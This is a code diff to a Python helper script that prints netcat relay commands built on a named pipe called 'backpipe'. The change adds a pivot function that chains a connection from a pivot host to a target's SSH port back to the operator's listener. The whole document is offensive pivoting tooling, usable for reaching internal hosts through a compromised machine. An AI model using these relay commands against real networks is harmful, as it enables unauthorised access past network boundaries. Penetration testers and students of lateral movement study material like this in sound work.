@@ -17,6 +17,7 @@ def parse_args(args: list):
 def main():
     args = parse_args(sys.argv[1:])
     label(start_nc_relay, host=args.you)
+    label(pivot_nc_relay, start_ip=args.you, tgt_ip=args.tgt, host=args.pivot)
     return
 
 
@@ -25,17 +26,33 @@ def label(func, host: str, *args, **kwargs):
     prefix = f"==================== on {host} =================="
     print(prefix)
     print(func(*args, **kwargs))
-    suffix = "==================================================="
+    suffix = "---------------------------------------------------"
     print(suffix)
     return
 
 
-def start_nc_relay(local_port: int = 2222, remote_port: int = 22222) -> str:
-    device_name = "backpipe"
-    device_type = "p"
+def start_nc_relay(devname: str = "backpipe",
+                   devtype: str = "p",
+                   local_port: int = 2222,
+                   remote_port: int = 22222
+                   ) -> str:
     cmd = f"""
-    mknod {device_name} {device_type}
-    nc -lvp {local_port} 0<{device_name} | nc -lvp {remote_port} | tee {device_name}
+    mknod {devname} {devtype}
+    nc -lvp {local_port} 0<{devname} | nc -lvp {remote_port} | tee {devname}
+    """
+    return cmd
+
+
+def pivot_nc_relay(start_ip: str,
+                   tgt_ip: str,
+                   tgt_port: int = 22,
+                   local_port: int = 2222,
+                   devname: str = "backpipe",
+                   devtype: str = "p",
+                   ) -> str:
+    cmd = f"""
+    mknod {devname} {devtype}
+    nc {tgt_ip} {tgt_port}  0<{devname} | nc {start_ip} {local_port} | tee {devname}
     """
     return cmd
 
